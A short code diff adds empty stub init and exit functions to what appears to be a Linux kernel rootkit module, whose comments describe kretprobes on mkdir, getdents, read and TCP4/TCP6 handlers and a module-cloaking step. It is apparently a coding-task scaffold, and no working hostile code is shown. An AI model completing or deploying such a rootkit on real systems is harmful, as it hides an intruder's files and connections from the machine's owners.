@@ -498,11 +498,20 @@ static struct kretprobe tcp6_probe = {
 //    mkdir_probe -> getdents_probe -> read_probe -> tcp4_probe -> tcp6_probe
 //    Each failure label unregisters the previous probe and falls through.
 //    The last failure label also removes the proc entry.
+static int __init rk_init(void)
+{
+	/* TODO: implement */
+	return 0;
+}
 
 // TODO: Implement rk_exit
 // 1. rk_uncloak() (in case module was cloaked).
 // 2. Unregister all five probes in reverse order.
 // 3. proc_remove the proc entry.
+static void __exit rk_exit(void)
+{
+	/* TODO: implement */
+}
 
 module_init(rk_init);
 module_exit(rk_exit);
